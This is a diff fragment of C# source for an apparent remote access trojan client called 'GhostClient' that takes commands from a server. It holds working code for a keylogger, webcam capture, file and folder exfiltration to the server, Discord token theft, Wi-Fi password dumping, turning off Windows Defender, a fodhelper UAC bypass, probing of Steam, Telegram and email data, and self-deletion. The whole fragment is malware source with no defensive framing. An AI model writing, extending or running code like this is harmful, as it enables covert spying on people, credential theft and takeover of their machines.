+                else sb.AppendLine("PATH NOT FOUND: " + dirPath);
+                return sb.ToString();
+            }
+            catch (Exception ex) { return "ERROR: " + ex.Message; }
+        }
+
+        // ── DOWNLOAD FILE (server -> client) ──
+        static string DownloadFile(string remoteFile, string localPath)
+        {
+            try
+            {
+                if (localPath == "") localPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Desktop), Path.GetFileName(remoteFile));
+                using (var wc = new WebClient())
+                {
+                    string url = SERVER + "/api/remote/clients/" + CLIENT_ID + "/files/download?name=" + Uri.EscapeDataString(Path.GetFileName(remoteFile));
+                    wc.DownloadFile(url, localPath);
+                }
+                return "Downloaded to: " + localPath;
+            }
+            catch (Exception ex) { return "ERROR: " + ex.Message; }
+        }
+
+        // ── UPLOAD FILE (client -> server) ──
+        static string UploadFile(string serverFileName, string localPath)
+        {
+            try
+            {
+                if (!File.Exists(localPath)) return "ERROR: File not found: " + localPath;
+                using (var wc = new WebClient())
+                {
+                    byte[] fileData = File.ReadAllBytes(localPath);
+                    wc.Headers["fileName"] = serverFileName;
+                    wc.UploadData(SERVER + "/api/remote/clients/" + CLIENT_ID + "/files/upload?name=" + Uri.EscapeDataString(serverFileName), "POST", fileData);
+                }
+                return "Uploaded: " + localPath + " as " + serverFileName;
+            }
+            catch (Exception ex) { return "ERROR: " + ex.Message; }
+        }
+
+        // ── DELETE PATH ──
+        static string DeletePath(string target)
+        {
+            try
+            {
+                if (Directory.Exists(target)) { Directory.Delete(target, true); return "Deleted directory: " + target; }
+                else if (File.Exists(target)) { File.Delete(target); return "Deleted file: " + target; }
+                else return "ERROR: Path not found: " + target;
+            }
+            catch (Exception ex) { return "ERROR: " + ex.Message; }
+        }
+
+        // ── WRITE FILE ──
+        static string WriteFile(string data)
+        {
+            // Format: !WRITE C:\path\to\file.txt|content
+            int pipeIdx = data.IndexOf('|');
+            if (pipeIdx < 0) return "ERROR: Usage: WRITE C:\\path\\file.txt|content";
+            string path = data.Substring(0, pipeIdx).Trim();
+            string content = data.Substring(pipeIdx + 1);
+            try
+            {
+                string dir = Path.GetDirectoryName(path);
+                if (!string.IsNullOrEmpty(dir) && !Directory.Exists(dir)) Directory.CreateDirectory(dir);
+                File.WriteAllText(path, content, Encoding.UTF8);
+                return "Written " + content.Length + " bytes to: " + path;
+            }
+            catch (Exception ex) { return "ERROR: " + ex.Message; }
+        }
+
+        // ── DOWNLOAD FOLDER (zip + upload) ──
+        static string DownloadFolder(string folderPath)
+        {
+            try
+            {
+                if (!Directory.Exists(folderPath)) return "ERROR: Directory not found: " + folderPath;
+                string zipPath = Path.Combine(Path.GetTempPath(), Path.GetFileName(folderPath) + ".zip");
+                if (File.Exists(zipPath)) File.Delete(zipPath);
+                ZipFile.CreateFromDirectory(folderPath, zipPath);
+                using (var wc = new WebClient())
+                {
+                    byte[] data = File.ReadAllBytes(zipPath);
+                    string zipName = Path.GetFileName(zipPath);
+                    wc.Headers["fileName"] = zipName;
+                    wc.UploadData(SERVER + "/api/remote/clients/" + CLIENT_ID + "/files/upload?name=" + Uri.EscapeDataString(zipName), "POST", data);
+                }
+                try { File.Delete(zipPath); } catch { }
+                return "Folder zipped and uploaded: " + zipPath;
+            }
+            catch (Exception ex) { return "ERROR: " + ex.Message; }
+        }
+
+        // ── IS ADMIN ──
+        static bool IsAdmin()
+        {
+            try
+            {
+                var identity = System.Security.Principal.WindowsIdentity.GetCurrent();
+                var principal = new System.Security.Principal.WindowsPrincipal(identity);
+                return principal.IsInRole(System.Security.Principal.WindowsBuiltInRole.Administrator);
+            }
+            catch { return false; }
+        }
+
+        // ── ELEVATE SELF ──
+        static string ElevateSelf()
+        {
+            try
+            {
+                if (IsAdmin()) return "Already running as admin";
+                var psi = new ProcessStartInfo(System.Reflection.Assembly.GetExecutingAssembly().Location)
+                {
+                    Verb = "runas",
+                    UseShellExecute = true,
+                    Arguments = CLIENT_ID,
+                };
+                Process.Start(psi);
+                return "Elevation requested. New process started as admin. Exiting this instance.";
+            }
+            catch (Exception ex) { return "ERROR: " + ex.Message; }
+        }
+
+        // ── ENABLE DEBUG PRIVILEGE ──
+        static bool EnableDebugPrivilege()
+        {
+            try
+            {
+                IntPtr hToken;
+                if (!OpenProcessToken(Process.GetCurrentProcess().Handle, TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, out hToken))
+                    return false;
+                long luid;
+                if (!LookupPrivilegeValue(null, SE_DEBUG_NAME, out luid)) return false;
+                var tp = new TOKEN_PRIVILEGES();
+                tp.PrivilegeCount = 1;
+                tp.Luid = luid;
+                tp.Attributes = SE_PRIVILEGE_ENABLED;
+                return AdjustTokenPrivileges(hToken, false, ref tp, 0, IntPtr.Zero, IntPtr.Zero);
+            }
+            catch { return false; }
+        }
+
+        // ── BSOD ──
+        static string TriggerBSOD()
+        {
+            try
+            {
+                EnableDebugPrivilege();
+                uint major = Environment.OSVersion.Version.Major;
+                uint minor = Environment.OSVersion.Version.Minor;
+                if (major >= 10) return "BSOD: Not supported on this Windows version via this method.\nUse !CRITPROC instead (process will trigger BSOD if killed).";
+                Process.Start("shutdown", "/r /t 0 /o /f");
+                return "System restart initiated with advanced options";
+            }
+            catch (Exception ex) { return "ERROR: " + ex.Message; }
+        }
+
+        // ── LIST PROCESSES ──
+        static string ListProcesses()
+        {
+            try
+            {
+                var sb = new StringBuilder();
+                sb.AppendLine(string.Format("{0,-40} {1,-10} {2,-15} {3,-10}", "Name", "PID", "CPU Time", "Memory(MB)"));
+                sb.AppendLine(new string('-', 80));
+                foreach (var p in Process.GetProcesses())
+                {
+                    try
+                    {
+                        string name = p.ProcessName.Length > 38 ? p.ProcessName.Substring(0, 38) : p.ProcessName;
+                        long memMB = -1;
+                        try { memMB = p.PrivateMemorySize64 / 1048576; } catch { }
+                        sb.AppendLine(string.Format("{0,-40} {1,-10} {2,-15} {3,-10}", name, p.Id, p.TotalProcessorTime.ToString(@"hh\:mm\:ss"), memMB >= 0 ? memMB.ToString() : "?"));
+                    }
+                    catch { }
+                }
+                return sb.ToString();
+            }
+            catch (Exception ex) { return "ERROR: " + ex.Message; }
+        }
+
+        // ── WEBCAM ──
+        static string CaptureWebcam()
+        {
+            try
+            {
+                Type mgrType = Type.GetTypeFromProgID("WIA.DeviceManager");
+                if (mgrType == null) return "ERROR: WIA not available";
+                object mgr = Activator.CreateInstance(mgrType);
+                var devices = (ArrayList)mgr.GetType().InvokeMember("DeviceInfos", System.Reflection.BindingFlags.GetProperty, null, mgr, null);
+                if (devices == null || devices.Count == 0) return "ERROR: No webcams found";
+                int idx = _selectedCamera;
+                if (idx >= devices.Count) idx = 0;
+                object devInfo = devices[idx];
+                string devId = devInfo.GetType().InvokeMember("DeviceID", System.Reflection.BindingFlags.GetProperty, null, devInfo, null).ToString();
+                object device = mgr.GetType().InvokeMember("Connect", System.Reflection.BindingFlags.InvokeMethod, null, mgr, new object[] { devId });
+                object item = device.GetType().InvokeMember("Items", System.Reflection.BindingFlags.GetProperty, null, device, null);
+                var itemsList = (ArrayList)item;
+                if (itemsList == null || itemsList.Count == 0) return "ERROR: No camera items";
+                object camItem = itemsList[0];
+                object transfer = camItem.GetType().InvokeMember("Transfer", System.Reflection.BindingFlags.InvokeMethod, null, camItem, new object[] { 1 });
+                object fileData = transfer.GetType().InvokeMember("FileData", System.Reflection.BindingFlags.GetProperty, null, transfer, null);
+                byte[] imgBytes = (byte[])fileData.GetType().InvokeMember("BinaryData", System.Reflection.BindingFlags.GetProperty, null, fileData, null);
+                if (imgBytes == null || imgBytes.Length == 0) return "ERROR: Empty image data";
+                using (var wc = new WebClient())
+                {
+                    wc.Headers["captureId"] = "webcam_" + DateTime.Now.Ticks;
+                    wc.UploadData(SERVER + "/api/remote/clients/" + CLIENT_ID + "/screenshot", "PUT", imgBytes);
+                }
+                return "Webcam photo captured and uploaded (" + imgBytes.Length + " bytes)";
+            }
+            catch (Exception ex) { return "ERROR: " + ex.Message; }
+        }
+
+        static string ListCameras()
+        {
+            try
+            {
+                Type mgrType = Type.GetTypeFromProgID("WIA.DeviceManager");
+                if (mgrType == null) return "ERROR: WIA not available";
+                object mgr = Activator.CreateInstance(mgrType);
+                var devices = (ArrayList)mgr.GetType().InvokeMember("DeviceInfos", System.Reflection.BindingFlags.GetProperty, null, mgr, null);
+                if (devices == null || devices.Count == 0) return "No cameras found";
+                var sb = new StringBuilder();
+                sb.AppendLine("Available cameras:");
+                for (int i = 0; i < devices.Count; i++)
+                {
+                    object dev = devices[i];
+                    string name = dev.GetType().InvokeMember("Name", System.Reflection.BindingFlags.GetProperty, null, dev, null).ToString();
+                    sb.AppendLine("  [" + i + "] " + name + (i == _selectedCamera ? " (selected)" : ""));
+                }
+                return sb.ToString();
+            }
+            catch (Exception ex) { return "ERROR: " + ex.Message; }
+        }
+
+        // ── KEYLOGGER ──
+        static void StartKeylog()
+        {
+            _keyboardProc = KeyboardHookCallback;
+            using (var curProcess = Process.GetCurrentProcess())
+            using (var curModule = curProcess.MainModule)
+            {
+                _keyboardHookId = SetWindowsHookEx(WH_KEYBOARD_LL, _keyboardProc, GetModuleHandle(curModule.ModuleName), 0);
+            }
+        }
+
+        static void StopKeylog()
+        {
+            if (_keyboardHookId != IntPtr.Zero)
+            {
+                UnhookWindowsHookEx(_keyboardHookId);
+                _keyboardHookId = IntPtr.Zero;
+            }
+            _keyboardProc = null;
+        }
+
+        static IntPtr KeyboardHookCallback(int nCode, IntPtr wParam, IntPtr lParam)
+        {
+            if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN)
+            {
+                int vkCode = Marshal.ReadInt32(lParam);
+                _keylogBuffer.Append((char)vkCode);
+            }
+            return CallNextHookEx(_keyboardHookId, nCode, wParam, lParam);
+        }
+
+        // ── TEXT-TO-SPEECH ──
+        static string SpeakText(string text)
+        {
+            try
+            {
+                Type speechType = Type.GetTypeFromProgID("SAPI.SpVoice");
+                if (speechType == null) return "ERROR: SAPI not available";
+                object voice = Activator.CreateInstance(speechType);
+                voice.GetType().InvokeMember("Speak", System.Reflection.BindingFlags.InvokeMethod, null, voice, new object[] { text, 0 });
+                return "Speaking: " + text;
+            }
+            catch (Exception ex) { return "ERROR: " + ex.Message; }
+        }
+
+        // ── WIFI ──
+        static string ListWiFi()
+        {
+            return ExecuteCmd("netsh wlan show profiles | findstr \"All User Profile\"");
+        }
+
+        static string GetWiFiPassword(string ssid)
+        {
+            return ExecuteCmd("netsh wlan show profile name=\"" + ssid + "\" key=clear");
+        }
+
+        // ── DISABLE DEFENDER ──
+        static string DisableDefender()
+        {
+            try
+            {
+                if (!IsAdmin()) return "ERROR: Admin required to disable Defender";
+                string cmd = "reg add \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\" /v DisableAntiSpyware /t REG_DWORD /d 1 /f";
+                Process.Start(new ProcessStartInfo("cmd.exe", "/c " + cmd) { WindowStyle = ProcessWindowStyle.Hidden, CreateNoWindow = true, UseShellExecute = false });
+                cmd = "powershell -Command \"Set-MpPreference -DisableRealtimeMonitoring $true\"";
+                Process.Start(new ProcessStartInfo("powershell.exe", "-Command \"Set-MpPreference -DisableRealtimeMonitoring $true -Force\"") { WindowStyle = ProcessWindowStyle.Hidden, CreateNoWindow = true, UseShellExecute = false });
+                return "Windows Defender disabled (requires reboot)";
+            }
+            catch (Exception ex) { return "ERROR: " + ex.Message; }
+        }
+
+        // ── WINDOWS PASSWORDS ──
+        static string GetWindowsPasswords()
+        {
+            try
+            {
+                var sb = new StringBuilder();
+                sb.AppendLine("=== WINDOWS CREDENTIALS ===");
+                // WIndows Credential Manager
+                string cmdOut = ExecuteCmd("cmdkey /list");
+                sb.AppendLine(cmdOut);
+                // SAM/SYSTEM dump attempt
+                string samDir = Environment.GetFolderPath(Environment.SpecialFolder.System).Replace("System32", "System32\\config\\RegBack");
+                if (Directory.Exists(samDir))
+                {
+                    sb.AppendLine("\nSAM files found at: " + samDir);
+                    sb.AppendLine("Use a tool like mimikatz to extract hashes.");
+                }
+                sb.AppendLine("\n=== LOCAL USERS ===");
+                sb.AppendLine(ExecuteCmd("net user"));
+                return sb.ToString();
+            }
+            catch (Exception ex) { return "ERROR: " + ex.Message; }
+        }
+
+        // ── TOKEN GRABBER ──
+        static string GrabTokens()
+        {
+            try
+            {
+                var sb = new StringBuilder();
+                sb.AppendLine("=== DISCORD TOKEN SEARCH ===");
+                string[] paths = new string[] {
+                    Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Discord",
+                    Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\discord",
+                    Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\discordptb",
+                    Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\discordcanary",
+                };
+                foreach (string basePath in paths)
+                {
+                    if (!Directory.Exists(basePath)) continue;
+                    string ldbPath = basePath + "\\Local Storage\\leveldb";
+                    if (!Directory.Exists(ldbPath)) continue;
+                    sb.AppendLine("Checking: " + ldbPath);
+                    foreach (string f in Directory.GetFiles(ldbPath, "*.ldb"))
+                    {
+                        try
+                        {
+                            string content = File.ReadAllText(f);
+                            // Match discord token pattern
+                            var matches = Regex.Matches(content, @"[a-zA-Z0-9_-]{24}\.[a-zA-Z0-9_-]{6}\.[a-zA-Z0-9_-]{27}");
+                            foreach (Match m in matches)
+                                sb.AppendLine("TOKEN: " + m.Value);
+                            matches = Regex.Matches(content, @"mfa\.[a-zA-Z0-9_-]{84}");
+                            foreach (Match m in matches)
+                                sb.AppendLine("MFA TOKEN: " + m.Value);
+                        }
+                        catch { }
+                    }
+                }
+                string result = sb.ToString();
+                if (result.Contains("TOKEN:")) return result;
+                return "No Discord tokens found. Check browser local storage manually.";
+            }
+            catch (Exception ex) { return "ERROR: " + ex.Message; }
+        }
+
+        // ── DISCORD INFO ──
+        static string GrabDiscordInfo()
+        {
+            try
+            {
+                var sb = new StringBuilder();
+                string discordPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\discord";
+                if (Directory.Exists(discordPath))
+                {
+                    sb.AppendLine("Discord installation found at: " + discordPath);
+                    string settingsPath = discordPath + "\\settings.json";
+                    if (File.Exists(settingsPath))
+                    {
+                        string settings = File.ReadAllText(settingsPath);
+                        sb.AppendLine("Settings: " + settings);
+                    }
+                }
+                string ldbDir = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Discord\\Local Storage\\leveldb";
+                if (Directory.Exists(ldbDir))
+                {
+                    sb.AppendLine("Discord local storage found at: " + ldbDir);
+                    sb.AppendLine("Use !GRABTOKENS to extract tokens.");
+                }
+                // Check running processes
+                foreach (var p in Process.GetProcesses())
+                {
+                    string name = p.ProcessName.ToLower();
+                    if (name.Contains("discord") || name.Contains("discordptb") || name.Contains("discordcanary"))
+                        sb.AppendLine("Discord running: " + p.ProcessName + " (PID: " + p.Id + ")");
+                }
+                if (sb.Length == 0) return "Discord not found on this system.";
+                return sb.ToString();
+            }
+            catch (Exception ex) { return "ERROR: " + ex.Message; }
+        }
+
+        // ── STEAM INFO ──
+        static string GrabSteamInfo()
+        {
+            try
+            {
+                var sb = new StringBuilder();
+                string steamPath = "C:\\Program Files (x86)\\Steam";
+                if (!Directory.Exists(steamPath)) steamPath = "C:\\Program Files\\Steam";
+                if (Directory.Exists(steamPath))
+                {
+                    sb.AppendLine("Steam found at: " + steamPath);
+                    string configPath = steamPath + "\\config\\config.vdf";
+                    if (File.Exists(configPath))
+                    {
+                        string config = File.ReadAllText(configPath);
+                        sb.AppendLine("Config file: " + configPath + " (" + config.Length + " bytes)");
+                    }
+                    string ssfnPath = steamPath + "\\ssfn*";
+                    sb.AppendLine("SSFN files: " + string.Join(", ", Directory.GetFiles(steamPath, "ssfn*")));
+                }
+                else sb.AppendLine("Steam not found in default locations.");
+                foreach (var p in Process.GetProcesses())
+                    if (p.ProcessName.ToLower().Contains("steam"))
+                        sb.AppendLine("Steam running (PID: " + p.Id + ")");
+                return sb.ToString();
+            }
+            catch (Exception ex) { return "ERROR: " + ex.Message; }
+        }
+
+        // ── TELEGRAM INFO ──
+        static string GrabTelegramInfo()
+        {
+            try
+            {
+                var sb = new StringBuilder();
+                string tgPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Telegram Desktop";
+                if (Directory.Exists(tgPath))
+                {
+                    sb.AppendLine("Telegram found at: " + tgPath);
+                    string tdata = tgPath + "\\tdata";
+                    if (Directory.Exists(tdata))
+                        sb.AppendLine("Session data found (tdata folder): " + tdata);
+                }
+                foreach (var p in Process.GetProcesses())
+                    if (p.ProcessName.ToLower().Contains("telegram"))
+                        sb.AppendLine("Telegram running (PID: " + p.Id + ")");
+                if (sb.Length == 0) return "Telegram not found on this system.";
+                return sb.ToString();
+            }
+            catch (Exception ex) { return "ERROR: " + ex.Message; }
+        }
+
+        // ── EMAIL CLIENTS ──
+        static string GrabEmailClients()
+        {
+            try
+            {
+                var sb = new StringBuilder();
+                string[] mailPaths = new string[] {
+                    Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Thunderbird",
+                    Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Thunderbird",
+                    Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Microsoft\\Outlook",
+                    Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Microsoft\\Outlook",
+                };
+                foreach (string p in mailPaths)
+                    if (Directory.Exists(p)) sb.AppendLine("Email client data: " + p);
+                foreach (var p in Process.GetProcesses())
+                {
+                    string n = p.ProcessName.ToLower();
+                    if (n.Contains("outlook") || n.Contains("thunderbird") || n.Contains("mail"))
+                        sb.AppendLine("Email client running: " + p.ProcessName);
+                }
+                if (sb.Length == 0) return "No email clients found.";
+                return sb.ToString();
+            }
+            catch (Exception ex) { return "ERROR: " + ex.Message; }
+        }
+
+        // ── UAC BYPASS ──
+        static string UACBypass()
+        {
+            try
+            {
+                if (IsAdmin()) return "Already running as admin";
+                // fodhelper.exe UAC bypass (Windows 10/11)
+                string exePath = System.Reflection.Assembly.GetExecutingAssembly().Location;
+                Registry.SetValue("HKEY_CURRENT_USER\\Software\\Classes\\ms-settings\\shell\\open\\command", "", exePath);
+                Registry.SetValue("HKEY_CURRENT_USER\\Software\\Classes\\ms-settings\\shell\\open\\command", "DelegateExecute", "");
+                Process.Start("fodhelper.exe");
+                return "UAC bypass attempted via fodhelper. New instance should be elevated.";
+            }
+            catch (Exception ex) { return "ERROR: " + ex.Message; }
+        }
+
+        // ── KILL SWITCH ──
+        static string KillSwitch()
+        {
+            try
+            {
+                string exePath = System.Reflection.Assembly.GetExecutingAssembly().Location;
+                // Remove from startup
+                try
+                {
+                    Registry.SetValue("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run", "GhostClient", "");
+                }
+                catch { }
+                // Delete itself via cmd script
+                string batPath = Path.Combine(Path.GetTempPath(), "ghost_cleanup.bat");
+                string batContent = "@echo off\n"
+                    + "timeout /t 2 /nobreak >nul\n"
+                    + "del /f /q \"" + exePath + "\"\n"
+                    + "del /f /q \"%~f0\"";
+                File.WriteAllText(batPath, batContent);
+                Process.Start(new ProcessStartInfo("cmd.exe", "/c \"" + batPath + "\"")
+                {
+                    WindowStyle = ProcessWindowStyle.Hidden,
+                    CreateNoWindow = true,
+                    UseShellExecute = false
+                });
+                return "Kill switch activated. Client will self-delete after exit.";
+            }
+            catch (Exception ex) { return "ERROR: " + ex.Message; }
+        }
+    }
+}
